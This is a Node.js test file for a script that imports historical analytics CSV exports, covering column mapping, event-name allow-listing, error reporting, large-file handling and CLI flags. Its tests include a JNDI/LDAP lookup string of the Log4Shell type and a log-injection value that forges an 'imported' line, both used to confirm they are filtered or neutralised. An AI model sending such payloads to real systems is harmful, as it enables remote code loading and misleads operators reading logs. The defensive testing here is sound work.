'use strict';

const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const { test } = require('node:test');

const os = require('node:os');

const { toDailyRows, parseArgs, main } = require('../scripts/import-penguin-history');
const { logger } = require('../src/utils/logger');

const fixture = (name) => fs.readFileSync(path.join(__dirname, 'fixtures', name), 'utf8');

const DAILY_CSV = fixture('penguin-daily-events-summary.csv');
const PAGE_VIEWS_CSV = fixture('penguin-page-views.csv');

// Fixed, because TimeGenerated is "when the import ran" and an assertion on Date.now() cannot hold.
const NOW = new Date('2026-09-06T18:30:00.000Z');

const OPTIONS = { env: 'test', now: NOW };

test('a daily_events_summary export is recognised by its columns', () => {
  assert.strictEqual(toDailyRows(DAILY_CSV, OPTIONS).view, 'daily_events_summary');
});

test('a daily_events_summary row becomes one rollup row', () => {
  const { rows } = toDailyRows(DAILY_CSV, OPTIONS);

  assert.deepStrictEqual(rows[0], {
    TimeGenerated: '2026-09-06T18:30:00.000Z',
    Day: '2026-08-01T00:00:00.000Z',
    SourceApp: 'eagle-public',
    EventName: 'Page Viewed',
    Page: '',
    ProjectId: '',
    Country: '',
    DeviceType: '',
    Env: 'test',
    Events: 1420,
    Sessions: 318,
    Users: 0
  });
});

test('counts arrive as numbers, not the strings the CSV holds', () => {
  const { rows } = toDailyRows(DAILY_CSV, OPTIONS);

  assert.strictEqual(rows[1].Events, 37);
});

test('every row in the file is mapped', () => {
  assert.strictEqual(toDailyRows(DAILY_CSV, OPTIONS).rows.length, 3);
});

test('TimeGenerated is when the import ran, because ingestion rewrites older timestamps', () => {
  const { rows } = toDailyRows(DAILY_CSV, OPTIONS);

  assert.strictEqual(rows[0].TimeGenerated, NOW.toISOString());
});

test('a page_views export is recognised by its columns', () => {
  assert.strictEqual(toDailyRows(PAGE_VIEWS_CSV, OPTIONS).view, 'page_views');
});

test('a quoted field holding a comma does not shift the columns after it', () => {
  const { rows } = toDailyRows(PAGE_VIEWS_CSV, OPTIONS);

  assert.strictEqual(rows[0].Events, 8210);
});

test('a page_views row takes its page from page_path', () => {
  const { rows } = toDailyRows(PAGE_VIEWS_CSV, OPTIONS);

  assert.strictEqual(rows[0].Page, '/projects');
});

// The view has no event type of its own, and the name has to be the one the client sends or a chart
// grouped by EventName splits page views into two series.
test('a page_views row carries the name the client sends for a page view', () => {
  const { rows } = toDailyRows(PAGE_VIEWS_CSV, OPTIONS);

  assert.strictEqual(rows[0].EventName, 'Page Viewed');
});

// penguin let the browser name events, so its exports hold both forms.
test('a penguin snake_case event type becomes the client name', () => {
  const csv = 'day,source_app,event_type,event_count,unique_sessions,unique_users\n' +
    '2026-08-01 00:00:00+00,eagle-public,session_start,10,10,0\n' +
    '2026-08-01 00:00:00+00,eagle-public,USER_ACTIVE,9,4,0\n';

  const names = toDailyRows(csv, OPTIONS).rows.map((row) => row.EventName);

  assert.deepStrictEqual(names, ['Session Started', 'User Active']);
});

test('an event type nobody mapped keeps the name its dashboards already use', () => {
  const csv = 'day,source_app,event_type,event_count,unique_sessions,unique_users\n' +
    '2026-08-01 00:00:00+00,eagle-public,Document Downloaded,20,5,0\n' +
    '2026-08-01 00:00:00+00,eagle-public,Page Viewed,11,5,0\n';

  const names = toDailyRows(csv, OPTIONS).rows.map((row) => row.EventName);

  assert.deepStrictEqual(names, ['Document Downloaded', 'Page Viewed']);
});

// penguin took the event name from the browser and never validated it, so its history holds scanner
// payloads as event names. This script posts to the DCR and never passes POST /events, so the
// allow-list here is the only thing between those strings and a chart's group-by.
const summary = (eventType) =>
  'day,source_app,event_type,event_count,unique_sessions,unique_users\n' +
  `2026-08-01 00:00:00+00,eagle-public,${eventType},7,3,0\n`;

test('a name this product emits is imported', () => {
  const { rows, dropped } = toDailyRows(summary('Map Marker Clicked'), OPTIONS);

  assert.strictEqual(rows.length, 1);
  assert.strictEqual(rows[0].EventName, 'Map Marker Clicked');
  assert.strictEqual(dropped.size, 0);
});

test('a name matching the allow-list in another case is imported', () => {
  assert.strictEqual(toDailyRows(summary('SEARCH EXECUTED'), OPTIONS).rows.length, 1);
});

test('a name no app emits is dropped, and counted against the name', () => {
  const { rows, dropped } = toDailyRows(summary('${jndi:ldap://scanner.invalid/x}'), OPTIONS);

  assert.deepStrictEqual(rows, []);
  assert.deepStrictEqual([...dropped], [['${jndi:ldap://scanner.invalid/x}', 1]]);
});

test('rows sharing an unknown name are counted together, not once', () => {
  const csv = 'day,source_app,event_type,event_count,unique_sessions,unique_users\n' +
    '2026-08-01 00:00:00+00,eagle-public,Test,7,3,0\n' +
    '2026-08-02 00:00:00+00,eagle-public,Test,9,4,0\n' +
    '2026-08-02 00:00:00+00,eagle-public,Search Executed,9,4,0\n';

  const { rows, dropped } = toDailyRows(csv, OPTIONS);

  assert.strictEqual(rows.length, 1);
  assert.strictEqual(dropped.get('Test'), 2);
});

test('a page_views row is never dropped: its name is the one the client sends', () => {
  assert.strictEqual(toDailyRows(PAGE_VIEWS_CSV, OPTIONS).dropped.size, 0);
});

test('Day is the UTC day of a timestamp, not the timestamp', () => {
  const { rows } = toDailyRows(PAGE_VIEWS_CSV, OPTIONS);

  assert.strictEqual(rows[0].Day, '2026-08-31T00:00:00.000Z');
});

test('Env is the environment the caller named', () => {
  const { rows } = toDailyRows(DAILY_CSV, { env: 'prod', now: NOW });

  assert.strictEqual(rows[0].Env, 'prod');
});

test('an export from another view is refused by name', () => {
  const csv = 'link_url,click_count\nhttps://example.gov.bc.ca,4\n';

  assert.throws(() => toDailyRows(csv, OPTIONS), /daily_events_summary or page_views/);
});

test('a count that is not a number names the line it is on', () => {
  const csv = 'day,source_app,event_type,event_count,unique_sessions,unique_users\n' +
    '2026-08-01 00:00:00+00,eagle-public,page_view,many,318,0\n';

  assert.throws(() => toDailyRows(csv, OPTIONS), /line 2: event_count 'many'/);
});

test('a day that is not a date names the line it is on', () => {
  const csv = 'day,source_app,event_type,event_count,unique_sessions,unique_users\n' +
    'last tuesday,eagle-public,page_view,10,3,0\n';

  assert.throws(() => toDailyRows(csv, OPTIONS), /line 2: day 'last tuesday'/);
});

test('a header with no rows under it is refused', () => {
  const csv = 'day,source_app,event_type,event_count,unique_sessions,unique_users\n';

  assert.throws(() => toDailyRows(csv, OPTIONS), /no rows/);
});

// The prod page_views export is 330,918 rows. Anything that hands one argument per row to a function
// — `push(...rows)` — dies with "Maximum call stack size exceeded" at that size and at no other, so
// the size is the test.
const HUGE = 200000;

/** A page_views export of `count` rows, on disk, because the CLI reads a file. */
function hugePageViewsCsv(count) {
  const lines = ['page_name,page_path,source_app,total_views,unique_sessions,unique_users,first_viewed,last_viewed'];
  for (let index = 0; index < count; index += 1) {
    lines.push(`Page ${index},/p/${index},eagle-public,3,2,0,2026-08-31 00:00:00+00,2026-08-31 12:00:00+00`);
  }
  const file = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'penguin-import-')), 'page_views.csv');
  fs.writeFileSync(file, `${lines.join('\n')}\n`);
  return file;
}

test('a 200,000-row export maps without overflowing the stack', (t) => {
  const file = hugePageViewsCsv(HUGE);
  t.after(() => fs.rmSync(path.dirname(file), { recursive: true, force: true }));

  const { rows } = toDailyRows(fs.readFileSync(file, 'utf8'), OPTIONS);

  assert.strictEqual(rows.length, HUGE);
});

test('a 200,000-row export survives the whole dry run, not just the mapping', async (t) => {
  const file = hugePageViewsCsv(HUGE);
  t.after(() => fs.rmSync(path.dirname(file), { recursive: true, force: true }));

  assert.strictEqual(await main(['--env', 'test', '--file', file, '--dry-run']), 0);
});

/** A CSV on disk, because the CLI reads files. */
function csvFile(text) {
  const file = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'penguin-import-')), 'daily.csv');
  fs.writeFileSync(file, text);
  return file;
}

const DROPPABLE = 'day,source_app,event_type,event_count,unique_sessions,unique_users\n' +
  '2026-08-01 00:00:00+00,eagle-public,Search Executed,7,3,0\n' +
  '2026-08-01 00:00:00+00,eagle-public,scanner-payload-one,7,3,0\n' +
  '2026-08-02 00:00:00+00,eagle-public,scanner-payload-one,4,2,0\n' +
  '2026-08-02 00:00:00+00,eagle-public,scanner-payload-two,4,2,0\n';

/** Run the CLI, keeping the log lines it wrote. */
async function runCli(t, argv) {
  const lines = [];
  t.mock.method(logger, 'info', (message) => lines.push(message));
  t.mock.method(logger, 'warn', (message) => lines.push(message));

  const code = await main(argv);

  return { code, lines };
}

test('the summary reports how many rows the unknown names cost, and how many names', async (t) => {
  const file = csvFile(DROPPABLE);
  t.after(() => fs.rmSync(path.dirname(file), { recursive: true, force: true }));

  const { code, lines } = await runCli(t, ['--env', 'test', '--file', file, '--dry-run']);

  assert.strictEqual(code, 0);
  assert.ok(lines.some((line) => line.includes('dropped 3 row(s) with unknown event name, 2 distinct')), lines.join('\n'));
  assert.ok(lines.some((line) => line.includes('1 row(s), 1 day(s), 7 event(s)')), lines.join('\n'));
});

// Without the flag the names stay out of the terminal: they are whatever a scanner posted.
test('the dropped names are listed only under --verbose', async (t) => {
  const file = csvFile(DROPPABLE);
  t.after(() => fs.rmSync(path.dirname(file), { recursive: true, force: true }));

  const quiet = await runCli(t, ['--env', 'test', '--file', file, '--dry-run']);
  assert.ok(!quiet.lines.some((line) => line.includes('scanner-payload-one')), quiet.lines.join('\n'));

  const loud = await runCli(t, ['--env', 'test', '--file', file, '--dry-run', '--verbose']);
  assert.ok(loud.lines.some((line) => line.includes('scanner-payload-one (2 row(s))')), loud.lines.join('\n'));
  assert.ok(loud.lines.some((line) => line.includes('scanner-payload-two (1 row(s))')), loud.lines.join('\n'));
});

test('a listed name is cut to 40 characters', async (t) => {
  const long = `x${'y'.repeat(80)}`;
  const file = csvFile('day,source_app,event_type,event_count,unique_sessions,unique_users\n' +
    `2026-08-01 00:00:00+00,eagle-public,${long},7,3,0\n`);
  t.after(() => fs.rmSync(path.dirname(file), { recursive: true, force: true }));

  const { lines } = await runCli(t, ['--env', 'test', '--file', file, '--dry-run', '--verbose']);

  assert.ok(lines.some((line) => line.includes(`${long.slice(0, 40)} (1 row(s))`)), lines.join('\n'));
  assert.ok(!lines.some((line) => line.includes(long)), 'the full name reached the log');

  // parseCsv honours RFC 4180 embedded newlines, so a quoted name can carry one. Left in, it would
  // print as a second line the operator cannot tell from the script's own output.
  const forged = csvFile('day,source_app,event_type,event_count,unique_sessions,unique_users\n' +
    '2026-08-01 00:00:00+00,eagle-public,"evil\n[import] 999999 row(s) imported",7,3,0\n');
  t.after(() => fs.rmSync(path.dirname(forged), { recursive: true, force: true }));

  const forgedRun = await runCli(t, ['--env', 'test', '--file', forged, '--dry-run', '--verbose']);
  const listed = forgedRun.lines.filter((line) => line.includes('[import]   '));
  assert.equal(listed.length, 1, forgedRun.lines.join('\n'));
  assert.ok(listed[0].includes('evil?[import] 999999 row(s) imported (1 row(s))'), listed[0]);
});

test('nothing is said about dropped rows when every name is known', async (t) => {
  const file = csvFile('day,source_app,event_type,event_count,unique_sessions,unique_users\n' +
    '2026-08-01 00:00:00+00,eagle-public,Search Executed,7,3,0\n');
  t.after(() => fs.rmSync(path.dirname(file), { recursive: true, force: true }));

  const { lines } = await runCli(t, ['--env', 'test', '--file', file, '--dry-run']);

  assert.ok(!lines.some((line) => line.includes('dropped')), lines.join('\n'));
});

test('the flags are read into an env, a file list and the dry-run switch', () => {
  const args = parseArgs(['--env', 'test', '--file', 'a.csv', '--file', 'b.csv', '--dry-run']);

  assert.deepStrictEqual(args, {
    env: 'test',
    files: ['a.csv', 'b.csv'],
    dryRun: true,
    verbose: false,
    help: false
  });
});

test('--verbose is read as a switch', () => {
  assert.strictEqual(parseArgs(['--env', 'test', '--verbose']).verbose, true);
});

// Without this the next flag becomes the file name, and the import reads nothing while reporting that
// it ran.
test('a --file with its value left out is refused, not filled from the next flag', () => {
  assert.throws(() => parseArgs(['--env', 'test', '--file', '--dry-run']), /--file needs a value/);
});

test('a trailing --env with no value is refused too', () => {
  assert.throws(() => parseArgs(['--env']), /--env needs a value/);
});
